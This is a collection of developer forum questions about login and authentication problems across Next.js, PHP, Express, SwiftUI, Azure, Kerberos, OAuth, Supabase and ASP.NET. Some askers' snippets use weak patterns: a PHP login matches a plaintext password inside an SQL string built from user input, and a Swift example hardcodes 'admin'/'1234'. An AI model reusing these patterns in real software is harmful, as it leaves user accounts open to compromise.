<pre><code>&quot;use client&quot;;




const Page: React.FC&lt;Props&gt; = (props) =&gt; {
  const router = useRouter();
  const [errors, setErrors] = useState&lt;{ [key: string]: string }&gt;({});

  async function handleSubmit(event: FormEvent&lt;HTMLFormElement&gt;) {
    event.preventDefault();

    const formData = new FormData(event.currentTarget);
    const email = formData.get(&quot;email&quot;);
    const password = formData.get(&quot;password&quot;);
    const confirm_password = formData.get(&quot;confirm_password&quot;);
    const phone_number = formData.get(&quot;phone_number&quot;);

    const response = await fetch(
      &quot;/api/signup&quot;,
      {
        method: &quot;POST&quot;,
        headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
        body: JSON.stringify({
          email,
          password,
          confirm_password,
          phone_number,
        }),
      },
    );

    if (response.ok) {
      router.push(&quot;/profile&quot;);
    } else {
      const data = await response.json();
      setErrors(data.error);
    }
  }

 ...
};

export default Page;

</code></pre>
<p>This is the middleware for protected pages:</p>
<pre><code>import type { NextRequest } from 'next/server'
 
export async function middleware(request: NextRequest) {
  const token=request.cookies.get('token')?.value;

  //send request to api to validate the token
  const validateResponse=await fetch('api/accounts/signin/verify/',{
    headers: { Authorization: `Bearer ${token}` },
  })

    // If the token is not valid (expired, not set, etc.), redirect to the login page
    if (!validateResponse.ok) {
        return Response.redirect(new URL('/auth/login', request.url));
      }
     // If the token is valid and the path is not '/profile', redirect to the profile page
  if (token &amp;&amp; !request.nextUrl.pathname.startsWith('/profile')) {
    return Response.redirect(new URL('/profile', request.url));
  }
    // If there's no token and the path is not '/auth', redirect to the login page
    if (!token &amp;&amp; !request.nextUrl.pathname.startsWith('/auth')) {
        return Response.redirect(new URL('/auth/login', request.url));
      }
 

}
 
export const config = {
  matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)'],
}
</code></pre>
"
"<p>When try to login to Admin Panel session created. But Can't Login to Admin Dashboard. Session Breaks. What's the problem ?</p>
<pre><code>&lt;?php
session_start();
require('connection.inc.php');
require('functions.inc.php');
$msg='';
if(isset($_POST['submit'])){
    $username=get_safe_value($con,$_POST['username']);
    $password=get_safe_value($con,$_POST['password']);
    $sql=&quot;select * from adminlogin where username='$username' and password='$password'&quot;;
    $res=mysqli_query($con,$sql);
    $count=mysqli_num_rows($res);
    if($count&gt;0){
        $_SESSION['ADMIN_LOGIN']='yes';
        $_SESSION['ADMIN_USERNAME']=$username;
        header('location:category_master.php');
        exit();
    }else{
        $msg=&quot;Please enter correct login details&quot;;  
    }
}
?&gt;
</code></pre>
<p>I tried Session auto start, Output Buffering, Session save path and everything I could do. I clearly see that session file created in tmp folder but session breaks. Though in php.ini file I mentioned session save path &quot;/tmp&quot;. What are the possible reasons. Please help me.</p>
"
"<p><a href=""https://i.stack.imgur.com/vlpd3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/vlpd3.png"" alt=""enter image description here"" /></a></p>
<p>I'm developing an Express application and aiming to implement the highest level of security possible. In this system, I want to ensure that even if a hacker somehow obtains a bearer token, they are unable to access backend APIs on behalf of the user. To achieve this, I plan to incorporate checks for the bearer token, IP address, device ID, user's geographic location, and any other unique identifiers tied to the user.</p>
<p>Furthermore, I want to implement a feature where users are immediately notified if someone logs into the website from a different device ID, IP address, or geographic location.</p>
<p>Could anyone provide guidance on creating middleware in Express to accomplish these security measures? Additionally, are there any existing libraries or frameworks that facilitate these functionalities?</p>
<p>I attempted to pass the device ID, user's location, and IP address in the API headers. However, I could not figure out how to do it.</p>
<p>While exploring potential solutions, I came across an open-source authentication system called Keycloak (<a href=""https://www.keycloak.org/"" rel=""nofollow noreferrer"">https://www.keycloak.org/</a>) that seems to offer the features you're looking for. Keycloak provides mechanisms to incorporate various security checks, including device ID, user location, and IP address verification.</p>
<p>Although Keycloak presents a comprehensive solution, I want to code and build the authentication system independently.</p>
"
"<p>After the correct login, I would like to move from <code>loginpageview()</code> to the <code>homepageview()</code>.</p>
<pre class=""lang-swift prettyprint-override""><code>Button(action: {
    if username == &quot;admin&quot; &amp;&amp; password == &quot;1234&quot; {
        isLoggedIn = true
        NavigationLink(
            destination: LoginView().navigationBarBackButtonHidden(true), label: {
                Text(&quot;Login&quot;)
                    .font(.headline)
                    .foregroundColor(.white)
                    .padding()
                    .frame(width: 200, height: 50)
                    .background(Color(red: 0.35, green: 0.47, blue: 0.51))
                    .cornerRadius(10)
                    .shadow(color: Color.black.opacity(0.1), radius: 2, x: 5, y: 2)
                    .overlay(
                        RoundedRectangle(cornerRadius: 20)
                            .stroke(.white, lineWidth: 2)
                    )
                    .offset(y:-20)
            })
    } else {
        showInvalidCredentialsAlert = true
    }
})
</code></pre>
"
"<p>Whats wrong? why hash and calculated hash not same?
in my opinion, everything is taken 1 in 1 from the documentation, I also checked with other people's code, and their logic is very similar to mine. Where is the error?</p>
<pre><code>import * as crypto from 'crypto';
import { TelegramAuthBody } from './types';
import * as process from 'process';

export const TelegramValidator = (payload: TelegramAuthBody) =&gt; {
  const { hash, ...data } = payload;

  const secret = crypto
    .createHash('sha256')
    .update(process.env.TELEGRAM_BOT_TOKEN)
    .digest('hex');

  console.log(secret);
  const dataCheckString = Object.keys(data)
    .filter((key) =&gt; String(data[key]).length &gt; 0)
    .map((key) =&gt; `${key}=${data[key]}`)
    .sort()
    .join('\n');
  console.log(dataCheckString);

  const hmac = crypto
    .createHmac('sha256', secret)
    .update(dataCheckString)
    .digest('hex');

  console.log(hmac); //90d1fbd25ac2c780030bf498d7cf1eeec33a5de801c59ba29cfdc95ca6973a14
  console.log(hash); //64dbbc3f87cf805ce918d7ca8356e9ca6243cc948fbe4d70b475a3c7287ae1e5

  return hmac === hash;
};

</code></pre>
<p>I try to swap secret and dataCheckString, but 0 effect.</p>
"
"<p>I have an firebase app. I'm using firebase auth. This works good. The problem, when the users open the link on facebook app these are getting something like this<a href=""https://i.stack.imgur.com/dgIpM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dgIpM.png"" alt=""enter image description here"" /></a></p>
"
"<p>I followed <a href=""https://dev.to/kasuken/a-plugin-for-insomnia-to-retrieve-secrets-from-azure-key-vault-3mip"" rel=""nofollow noreferrer"">these instructions</a> to connect Insomnia to Azure Keyvault and I was able to get secrets from the Keyvault.</p>
<p>However, I havent been able to find anything helpful online about how I can do the same thing but with a certificate.</p>
<p>The API endpoint I want to call requires a certificate which I need to dynamically get from Keyvault when I call it. Is there a way to do this with Insomnia?</p>
"
"<p>We currently store ACR secrets (the access key passwords) in dSMS, and we have to manually rotate those periodically. We want to use key vault to manage the access key if applicable.</p>
<p>For using key vault, I wonder if there are some ref links about step to step instructions? Besides, if using the key vault, what permissions are needed and what's the authentication process?</p>
<p>A side question, do ACR access key passwords accept secrets generated from dSMS?</p>
<p>Thanks in advance!</p>
"
"<p>I setup an app so we can use Login with LinkedIn. I believe we setup the app correctly, however it's not working. Not sure why.</p>
<p>Attached is a screenshot of our account and settings, and a screenshot of the message we receive. Can you assist?</p>
<p>Here is a link to the page where we want our users to be able to Login with LinkedIn:</p>
<p><a href=""https://joplin.ai/signup"" rel=""nofollow noreferrer"">https://joplin.ai/signup</a></p>
<p>Attached is a screenshot of our account and settings, and a screenshot of the message we receive. Can anyone assist?</p>
<p><a href=""https://i.stack.imgur.com/LB6d6.png"" rel=""nofollow noreferrer"">enter image description here</a>
<a href=""https://i.stack.imgur.com/0AbrN.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>We entered the Client ID and Client Secret into our website.</p>
<p>We went through and were able to setup the Google and Facebook versions, but the Login with LinkedIn is giving us issues.</p>
"
"<p>I'd like to implement a feature, in which service users could be created programatically. For example, on my backend on an endpoint I receive the necessary credentials, then I create a service user on Zitadel.</p>
<p>Going through the docs I have only found how to register a human user, but nothing about service users. Is it possible? I have not found an endpoint for this between the API endpoints listed here: <a href=""https://zitadel.com/docs/category/apis/resources/user_service/user-service"" rel=""nofollow noreferrer"">https://zitadel.com/docs/category/apis/resources/user_service/user-service</a></p>
"
"<p>I am working on a Python script to authenticate and transfer files to the shared drive using Kerberos via SMB. I have a Key Distribution Center (KDC) and a Kerberos realm set up, and I need to connect to an SMB server for file transfer. Previously ntlm auth was being used. But due to security reasons it was disabled by cyber team.</p>
<p>We have successfully done kerberos authentication for transfering files to the shared drive via smb in java. but when it comes to python, the libraries such as gssapi, requests_kerberos needs keberos client application to be installed in a system and the path variable needs to be set. But this cannot be done since this python will be run in aws lambda. is there any other alternative way to do this?</p>
"
"<p>I have recently switched on the out of the box Azure app service authentication for a legacy ASP.NET web application built with ASMX services. The application is accessed via an iFrame from within Microsoft Dynamics 365 online and intermittently throws a http 401 error in production.</p>
<p>This is often resolved by a simple refresh. There's no specific login page, the navigation to the iframe tab is intended to be seamless.</p>
<p>Are the intermittent http 401 errors expected? If not, how could I best approach resolving them so that the iFrame integration is seamless?</p>
<p>Manual refreshes of the page have helped work around the issue but I am unaware of what is causing them to begin with so have not implemented any solutions.</p>
"
"<p>I am trying call an API(written in C#) from Excel VBA. The Request message is formed within the Excel VBA and send to the API. The message looks like as follows:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;IncomingMessage xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
               xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
   &lt;MessageSource&gt;hello&lt;/MessageSource&gt;
   &lt;MessagefromID&gt;Newuser&lt;/MessagefromID&gt;
   &lt;MessageVersion&gt;20240221&lt;/MessageVersion&gt;
   &lt;MessageType&gt;1&lt;/MessageType&gt;
   &lt;Command&gt;Select Count(1) AS count from TableName&lt;/Command&gt;
   &lt;MessageParams/&gt;
   &lt;MessageTimeStamp&gt;2024-03-08T14:03:10.00&lt;/MessageTimeStamp&gt;
&lt;/IncomingMessage&gt;
</code></pre>
<p>Also some message header are set:</p>
<pre><code>httpObject.setRequestHeader &quot;Content-type&quot;, &quot;application/xml&quot;
    httpObject.setRequestHeader &quot;Content-Length&quot;, Len(MessageVariable)
</code></pre>
<p>When I try to call the API from the excel macro I get the error -</p>
<pre><code>401 - Unauthorized: Access is denied due to invalid credentials
</code></pre>
<p>I would like to have Windows Authentication enabled. Meaning only AD users of the Domain can access the API.</p>
<p>The IIS Authentication setting for the Application Pool is as follows:</p>
<pre><code>Anonymous Auth - Disabled
Basic Auth - Disabled
Windows Auth - Enabled

</code></pre>
<p>The IIS Authorization setting for the Application Pool is as follows:</p>
<pre><code>Deny - Anonymous User
Allow - All Users

</code></pre>
<p>The Identity of the Application pool is &quot;ApplicationPoolIdentity&quot;.</p>
<p>Can you please advise, if I should send something extra in the request header to make it work? Or some other IIS settings that must be updated.</p>
<p>Note: I have tried to update the Identity of the Application Pool to &quot;Local System&quot; , but to no use.</p>
<p>Many thanks in advance for any help.</p>
"
"<p>we’re looking to build out an Okta integration that will become part of our customers flow. We want to be able to call our api with details from our customers okta login. We’ll pass these details to our api and do our business logic to either approve or deny the log in attempt. If denied we’d like to provide some details about why. Would anyone be able to point me in the right direct for achieving this?</p>
<p>I’ve been playing around with okta and auth0 without much luck.</p>
"
"<p>I need to use google sign-in and i need the firgerprints to access to API when I run that command I should obtain the SHA-1 AND SHA-256 keys but it's not any suggest?
<a href=""https://i.stack.imgur.com/3IV56.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3IV56.png"" alt=""enter image description here"" /></a></p>
"
"<p>I'm trying to do a JWT authentication to a distinct API.</p>
<p>As @nuxtjs/auth-next doesn't seem to be up to date and as I read it was possible to use the new global method fetch in Nuxt 3 instead of @nuxtjs/axios (not up to date also), I thought it won't be too hard to code the authentication myself! But it stays a mystery to me and I only found documentation on Vue project (using Pinia to keep user logged in) and I'm a bit at a lost.</p>
<p>What I would like to achieve:</p>
<p>a login page with email and password, login request send to API (edit: done!)
get JWT token and user info from API (edit: done!) and store both (to keep user logged even if a page is refresh)
set the JWT token globally to header $fetch requests (?) so I don't have to add it to each request
don't allow access to other pages if user is not logged in
Any help on this?</p>
"
"<p>I'm trying to catch a user register and email confirmation event.
In the register page, I have supabase.auth.onAuthStateChange event listener that redirects them to another screen saying to click on the link on the email when the user signUp.</p>
<p>In this confirmation screen, I have another event listener that tracks the confirmation process. When I happens, it redirects them to the main page.</p>
<p>The docs says:</p>
<blockquote>
<p>If Confirm email is enabled, a user is returned but session is null.</p>
<p>If Confirm email is disabled, both a user and a session are returned.</p>
</blockquote>
<p>So, here's the event listener on the register page:</p>
<pre><code>late final StreamSubscription&lt;AuthState&gt; _authSubscription;
  @override
  void initState() {
    super.initState();
    _authSubscription = supabase.auth.onAuthStateChange.listen((event) {
      final session = event.session;
      print('printing session on RegisterPage: $session\n\n');
      if (session?.user != null) {
        Navigator.of(context).pushReplacementNamed('/confirm_email');
      }
    });
  }
</code></pre>
<p>The listener on the confirmation email page:</p>
<pre><code>late final StreamSubscription&lt;AuthState&gt; _authSubscription;
  @override
  void initState() {
    super.initState();
    _authSubscription = supabase.auth.onAuthStateChange.listen((event) {
      final session = event.session;
      print('printing session on ConfirmEmailPage: $session\n\n');
      if (session?.user != null) {
        Navigator.of(context).pushReplacementNamed('/home');
      }
    });
  }
</code></pre>
<p>My email confirmation is on.
I didn't see any print on the degub console either.
Can you guys help me stop the issue?
Thank you.</p>
"
"<p>I've searched and have not found any answer that doesn't involved handling the credentials in <code>webView(_:didReceive:completionHandler:)</code></p>
<p>My goal is to render the same auth challenge that occurs in Safari or any other browser so that my code doesn't have to touch the user's credentials.</p>
<p>You can see a sample challenge by visiting <a href=""https://httpbin.org/basic-auth/username/password"" rel=""nofollow noreferrer"">https://httpbin.org/basic-auth/username/password</a> in any browser</p>
<p>Is this even possible?</p>
<p>For clarity:
If you visit the link above in a normal browser, an auth challenge is displayed/rendered. If you do so in a <code>WKWebView</code>, nothing is displayed. You sit at a white screen.</p>
<p>I'm trying to determine the difference in those behaviors, such as why is it rendered in a normal browser but not web view? Is it the browser that renders the challenge, or is it part of the web content of the URL being visited?</p>
<p>Finally, can Basic Auth be done in <code>WKWebView</code> (or <code>WebView</code>) in such a way as my code doesn't touch the user credentials, because it's the web server handling it via the content displayed in those views?</p>
"
"<p>I have a System endpoint  which requires ClientID, SecretKey, Scope and grantType. I set the client-wide authenticator by assigning the Authenticator property of RestClientOptions.</p>
<p>Now I also have a Business enpoint which requires Username, Password, ClientID, SecretKey, Scope and grantType and it requires a new AuthToken. I want to replace the Authenticator  token
This statement is not allowing me to retrieve a new token. It is not calling the GetToken method because there is already Token assigned.</p>
<pre><code>  Token = string.IsNullOrEmpty(Token) ? await GetToken() : Token;
</code></pre>
<p>How do I reset the Authenticator Token, when I run the business endpoints and generate a new Token.</p>
"
"<p>I already have an admin page protected under an login, but I want to know if there is any way I can edit server files (like on FileZilla) through a webpage on my admin page. The closest thing to what I'm looking for that h5ai, but It doesn't appear to allow you to edit files, only view them.</p>
"
"<p>I'm trying to use the Python requests module to download an mp4 video off a website behind a paywall.  Here's my code:</p>
<pre><code>link_href = # Found the mp4 link on the website
with open('D:/filename','wb') as f:
    response = requests.get(link_href)
    f.write(response.content)
</code></pre>
<p>I looked at the <code>response.content</code> and it's the html for the site's login page.  How do I get the mp4?</p>
"
"<p>I'm trying to setup Google login for my project but I seem to struggle understanding the proper flow once the request comes back from Google's <code>signin-google</code> middleware and then back to my own callback defined in my Web API, also, handling everything in the UI side (React in this case).</p>
<p>I debugged my callback endpoint and I do get the code etc from the signin-google initial callback. I'm stuck as I don't really know where to go next, I do know that I would need to have checks to see if that user already exists, otherwise create an account for them in my database.</p>
<p>But from here on wards, what would the process be to make sure I can login and display the info on my client side.</p>
<p>In my project I'm using JWT tokens for auth and already have the functionality or normal signup/signin but nothing with an external provider.</p>
<p>Any help will be appreciated.</p>
<p><strong>What I have at the moment</strong></p>
<ul>
<li>Set up my project, credentials, consent screens in Google cloud</li>
<li>Configured the Google credentials in my <code>AddAuthentication().AddGoogle()</code> of my <code>program.cs</code>:</li>
</ul>
<pre class=""lang-cs prettyprint-override""><code>builder.Services.AddAuthentication()
.AddCookie(options =&gt; {
    options.LoginPath = &quot;/auth/unauthorized&quot;;
    options.AccessDeniedPath = &quot;/auth/forbidden&quot;;
}).AddJwtBearer(opts =&gt; {
    opts.SaveToken = true;
    opts.TokenValidationParameters = tokenValidationParameters;
}).AddGoogle(options =&gt; {
    IConfigurationSection googleAuthSection = builder.Configuration.GetSection(&quot;Authentication:Google&quot;);
    options.ClientId = googleAuthSection[&quot;ClientId&quot;];
    options.ClientSecret = googleAuthSection[&quot;ClientSecret&quot;];
});
</code></pre>
<p>I have an endpoint which I call when a user clicks &quot;Sign in with google&quot; which takes me to Googles login page:</p>
<pre class=""lang-cs prettyprint-override""><code>[HttpGet(&quot;google&quot;)]
public async Task&lt;IActionResult&gt; GoogleLogin(string? returnUrl) 
{
    const string provider = GoogleDefaults.AuthenticationScheme;
    var properties = new AuthenticationProperties {
                RedirectUri = Url.Action(&quot;GoogleCallback&quot;, &quot;Auth&quot;, new { returnUrl})
            };
    return Challenge(properties, provider);
}
</code></pre>
<p>and the ReactJS button</p>
<pre class=""lang-js prettyprint-override""><code>const handleGoogleAuthentication = () =&gt; {
    var clientId = &quot;myclientid&quot;;
    var redirectUri = &quot;https://localhost:7132/api/auth/google&quot;;
    var scope = &quot;https://www.googleapis.com/auth/userinfo.email&quot;;
    var googleCallbackUrl = `https://accounts.google.com/o/oauth2/v2/auth?response_type=code&amp;client_id=${clientId}&amp;redirect_uri=${redirectUri}&amp;scope=${encodeURIComponent(scope)}&amp;access_type=online&amp;prompt=select_account&amp;state=${&quot;&quot;}`;
    window.location.href = googleCallbackUrl;
}
</code></pre>
<p>I also have an endpoint for the Google callback (not much here), here is where I'm lost since most tutorials I've seen cover ASP.NET Core MVC, Razor pages etc.</p>
<pre class=""lang-cs prettyprint-override""><code>[HttpGet(&quot;googlecallback&quot;, Name = &quot;GoogleCallback&quot;)]
public async Task&lt;IActionResult&gt; GoogleCallback() 
{
    string code = HttpContext.Request.Query[&quot;code&quot;];
    string scope = HttpContext.Request.Query[&quot;scope&quot;];
    string authUser = HttpContext.Request.Query[&quot;authUser&quot;];
    string prompt = HttpContext.Request.Query[&quot;prompt&quot;];
}
</code></pre>
"
"<p>I'm working on a project with the following setup:</p>
<p><strong>Identity Provider</strong>: Duende IdentityServer (localhost:3010)<br />
<strong>Frontend</strong>: Next.js v14 application with next-auth v5 for authentication, using MongoDB to store sessions (localhost:3000)<br />
<strong>Backend API</strong>: Nest.js (localhost:3005)<br />
I have configured my Next.js application to rewrite all API calls to the Nest.js backend using next.config.js (rewrites).</p>
<p>I've been researching <a href=""https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"" rel=""nofollow noreferrer"">session</a> versus <a href=""https://jerrynsh.com/all-to-know-about-auth-and-cookies/"" rel=""nofollow noreferrer"">JWT</a> tokens for authentication and have some concerns regarding the best approach to use, especially for my Nest.js API.</p>
<p><strong>Considering JWT</strong>:<br />
Token Invalidity Issues: I'm concerned about situations where the Next.js session expires but the JWT hasn't yet, and vice versa. Managing token lifecycles could become problematic.<br />
<strong>Authorization Header Handling</strong>: Since I cannot append the Authorization header in Next.js middleware (for rewrites does not work) or in next.config.js rewrites, I must add it manually to each fetch request. This adds boilerplate code and complexity.</p>
<p><strong>Considering Session</strong>:<br />
I'm leaning towards using sessions, as headers with the next-auth session cookie (containing the <code>sessionToken</code> ID) will be sent to the Nest.js API. I plan to use a custom guard with the passport-custom module in Nest.js to validate user sessions against the MongoDB sessions collection, checking for expiration.</p>
<p>The potential downside I see is for future mobile app integration, which might require JWT for easier handling. Maybe I'm wrong...</p>
<p><strong>My Concerns</strong>:<br />
While I'm inclined towards session-based authentication in this web context, I'm worried I might overlook some security implications or limitations, especially regarding scalability and interoperability with potential mobile applications.</p>
<p><strong>My question</strong>:<br />
Can I use session authentication in Nestjs API, or I have to use JWT?
Are there specific security or architectural considerations I should be aware of for either method?</p>
"
"<p>HTML:
I already tried using @if but it doesnt change anything</p>
<pre><code>
      &lt;a routerLink=&quot;/cadastro&quot; *ngIf=&quot;isLoggedIn&quot;&gt;LOGOUT&lt;/a&gt;
        
      &lt;a routerLink=&quot;/cadastro&quot; *ngIf=&quot;!isLoggedIn&quot;&gt;LOGIN&lt;/a&gt;
</code></pre>
<p>TYPESCRIPT:
This basicly sets is LoggedIn to true if there is user information on auth Service
But the problem is that the navbar is not getting updated, feels like it needed a refresh or something like this.</p>
<pre><code>      export class NavbarComponent implements OnInit {
      authService: AuthService = inject(AuthService);
      isLoggedIn: boolean = false;


  

      ngOnInit() {
      
      this.authService.user.subscribe((user: User) =&gt; {
      
      this.isLoggedIn = user ? true : false;
      
       
      

      console.log(this.isLoggedIn, user)
       });
       }
       }
</code></pre>
<p>I am no idea how to solve, please help me! Ive already tried changing @if/@else, end using if(user){isloggedin = true} but nothing works!</p>
"
"<p>my company want's to make a big old monolithic project to small microservices, but we should also make auth e2ee, so I need to know is it better to make a custom auth app in kuber (no idea how to do it) or use a gateway in kuber (I don't have a clue which of them support it or even is there any of them that supports)  I need you'r advice in this b.c I am new to this microservice world</p>
<p>(we live in Iran so no aws google cloud or something like paying to international company)</p>
<p>thank you</p>
<p>i read alot of online articles but not found a best practice ftor this job so i think i stuck right now</p>
"
"<p>I've created an Admin user, checked if it in the db, tried different passwords and usernames, but same error occurs...</p>
<p>I set in config file</p>
<pre><code>rbac = True
authenticate = True
auth_backends = airflow.contrib.auth.backends.password_auth
</code></pre>
<p>It seems that I tried everything imaginable pls someone help me...</p>
"
"<p>I am developing a python app with <a href=""https://github.com/microsoftgraph/msgraph-sdk-python"" rel=""nofollow noreferrer"">msgraph SDK</a>.</p>
<p>I want to list Sharepoint entries of the personal drive of the user that is logged in the local Windows OS with the organization Active Directory user account that is synced with Entra Active Directory and its Microsoft 365 License.</p>
<p>The usual situation is that when the user logs in the local system, it is already logged in Microsoft 365, so he goes with Edge to its sharepoint site and find them without login again.</p>
<p>My problem is that when I launch the program from CLI as the logged user I get:</p>
<p><code>To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code ABC456GHI to authenticate.</code></p>
<p>I would like that msgraph connects to Microsoft server as it is the logged user.</p>
<p>I would like to provide a desktop app to the user so I want to use delegated access. I don't want to share the <code>client_secret</code> of my registered Entra App.</p>
<p>Is it possibile what I ask, or it is unfeasible and probably a security issue?</p>
<p>Below it is my code to list user's drives. It works but is asks the use to login:</p>
<pre><code>import asyncio

from azure.identity.aio import DefaultAzureCredential, ClientSecretCredential
from azure.identity import DeviceCodeCredential
from kiota_authentication_azure.azure_identity_authentication_provider import AzureIdentityAuthenticationProvider
from kiota_abstractions.api_error import APIError

from msgraph.generated.models.o_data_errors.o_data_error import ODataError
from msgraph.generated.users.item.user_item_request_builder import UserItemRequestBuilder
from msgraph import GraphRequestAdapter, GraphServiceClient

class settings:
    MICROSOFT_AUTH_TENANT_ID = &quot;&lt;your tenant id&gt;&quot;
    MICROSOFT_AUTH_CLIENT_ID = &quot;&lt;your client id&gt;&quot;


class MSApiDealer:

    async def get_delegated_credentials(self):

        return DeviceCodeCredential(
                tenant_id=settings.MICROSOFT_AUTH_TENANT_ID,
                client_id=settings.MICROSOFT_AUTH_CLIENT_ID)

    async def alogin(self):

        credentials = await self.get_delegated_credentials()
        scopes = ['User.Read', 'Files.Read.All', 'Sites.Read.All']
        self.graph_client = GraphServiceClient(credentials=credentials, scopes=scopes)

    async def aget_sp_info(self):

        drive_info = await self.graph_client.me.drives.get()
        for el in drive_info.value:
            print(f&quot;{el.id=}, {el.name=}&quot;)
        
    async def ado_the_job(self):
        await self.alogin()
        await self.aget_sp_info()


if __name__ == &quot;__main__&quot;:

    msapi = MSApiDealer()
    asyncio.run(msapi.ado_the_job())
</code></pre>
"
"<p>currently i'm working on an application using a domain driven design approach, one of my User modules is responsible for user management.</p>
<p>When it comes to authentication, authorization, I’m looking for the best way to implement security, where it’s supposed to be implemented in the domain or in another layer?</p>
<p>If you have any experience in DDD project please share with me your feedback .</p>
<p>I expect to have feedback on a security implementation using DDD as approach</p>
"
"<p>I have 2 sections in my website. I used laravel spatie for admin and laravel/sanctum for frontend.
When I use Postman to check front end routes instead showing error &quot;You have not access to this page&quot; redirect to admin login page!</p>
<p>LoginController.php</p>
<pre><code> protected function redirectTo()
    {
        if (!Auth::check()) {
                      return route('admin_login');
        }
    }
</code></pre>
<p><a href=""https://i.stack.imgur.com/3S4gv.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3S4gv.jpg"" alt=""enter image description here"" /></a></p>
<p>But I want to separate Spatie error and Sanctum error</p>
"
"<p>I have an ASP.NET site using cookie based authentication. I am trying to stop concurrent logins and shared logins for our users who are sharing their credentials. I had the validation interval set up at 30 minutes, but even when I set it to 1 minute or a zero timespan, nothing happens.</p>
<p>When debugging locally, I can sign in on chrome, then sign in on another window, but the first login does not get forced out, even after waiting for the validation interval to pass or refreshing the page.</p>
<p>What am I not understanding?</p>
<p>Thanks!</p>
<p>Login page logic:</p>
<pre><code>var user = await _signInManager.UserManager.FindByEmailAsync(Input.Email);

if (user == null)
{
    ModelState.AddModelError(&quot;&quot;, &quot;Invalid login attempt.&quot;);
    return Page();
}

// Update the security stamp for the user
// This makes sure all other computers/browsers are logged out
// when the cookie/credentials are checked next
await _signInManager.UserManager.UpdateSecurityStampAsync(user);

// Attempt to sign in the user
var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Input.RememberMe, lockoutOnFailure: true);

if (result.Succeeded)
{
    return RedirectToReturnUrl(returnUrl);
}
else if (result.IsLockedOut)
{
    ModelState.AddModelError(&quot;&quot;, &quot;Your account is locked out.&quot;);
    return Page();
}
else
{
    ModelState.AddModelError(&quot;&quot;, &quot;Invalid login attempt.&quot;);
    return Page();
}
</code></pre>
<p>Startup code:</p>
<pre><code>// Set the security stamp options
services.Configure&lt;SecurityStampValidatorOptions&gt;(options =&gt;
{
    options.ValidationInterval = TimeSpan.Zero;// TimeSpan.FromMinutes(30);
    options.OnRefreshingPrincipal = context =&gt;
    {
        // Custom claims logic excluded
        return Task.FromResult(0);
    };
});

// Add the authentication state provider
services.AddScoped&lt;AuthenticationStateProvider, RevalidatingIdentityAuthenticationStateProvider&lt;MyCustomIdentityUser&gt;&gt;();
</code></pre>
<p><code>RevalidatingIdentityAuthenticationStateProvider.cs</code>:</p>
<pre><code>public class RevalidatingIdentityAuthenticationStateProvider&lt;TUser&gt; : RevalidatingServerAuthenticationStateProvider where TUser : class
{
    private readonly IServiceScopeFactory _scopeFactory;
    private readonly IdentityOptions _options;

    public RevalidatingIdentityAuthenticationStateProvider(
        ILoggerFactory loggerFactory,
        IServiceScopeFactory scopeFactory,
        IOptions&lt;IdentityOptions&gt; optionsAccessor)
        : base(loggerFactory)
    {
        _scopeFactory = scopeFactory;
        _options = optionsAccessor.Value;
    }

    protected override TimeSpan RevalidationInterval =&gt; TimeSpan.Zero;// TimeSpan.FromMinutes(30);

    protected override async Task&lt;bool&gt; ValidateAuthenticationStateAsync(
        AuthenticationState authenticationState, CancellationToken cancellationToken)
    {
        // Get the user manager from a new scope to ensure it fetches fresh data
        var scope = _scopeFactory.CreateScope();
        try
        {
            var userManager = scope.ServiceProvider.GetRequiredService&lt;UserManager&lt;TUser&gt;&gt;();
            return await ValidateSecurityStampAsync(userManager, authenticationState.User);
        }
        finally
        {
            if (scope is IAsyncDisposable asyncDisposable)
            {
                await asyncDisposable.DisposeAsync();
            }
            else
            {
                scope.Dispose();
            }
        }
    }

    private async Task&lt;bool&gt; ValidateSecurityStampAsync(UserManager&lt;TUser&gt; userManager, ClaimsPrincipal principal)
    {
        var user = await userManager.GetUserAsync(principal);
        if (user == null)
        {
            return false;
        }
        else if (!userManager.SupportsUserSecurityStamp)
        {
            return true;
        }
        else
        {
            var principalStamp = principal.FindFirstValue(_options.ClaimsIdentity.SecurityStampClaimType);
            var userStamp = await userManager.GetSecurityStampAsync(user);
            return principalStamp == userStamp;
        }
    }
}
</code></pre>
<p>I tried reducing the validation intervals and updating the security stamps.  If I manually update the security stamps in the database, it also doesn't force a logout of the user.</p>
"
"<p>I am trying to find a way to imperatively authorize resources in an asp.net razor pages application. So far, I have followed the guide found in this link: <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0</a>. But, I am running into a problem where I want to be able to reuse authentication logic for various different requirements, without having to define a new class which inherits that specific requirement.</p>
<p>For example, I have a location object that I want to be viewable under the following conditions:</p>
<ol>
<li>If the user is of the role Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of.</li>
</ol>
<p>I have successfully built a requirement, and two handlers to implement this logic as follows:</p>
<pre><code>public class IsAdminOrHigherHandler : AuthorizationHandler&lt;AccessLocationRequirement&gt;
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement)
    {
        if (context.User.IsInRole(SD.Roles.Admin.ToString()) || context.User.IsInRole(SD.Roles.Master.ToString()))
        {
            context.Succeed(requirement);
        }
        return Task.CompletedTask;
    }
}

public class InLocationsZoneHandler : AuthorizationHandler&lt;AccessLocationRequirement, Location&gt;
{
    private readonly IUserService _userService;
    public InLocationsZoneHandler(IUserService userService)
    {
        _userService = userService;
    }
    protected override async Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement,
        Location resource)
    {
        User? user = await _userService.GetUserFromContextAsync();
        if (user == null)
        {
            context.Fail();
            return;
        }
        if (user.Zones.Any(z =&gt; z.Id == resource.Zone.Id))
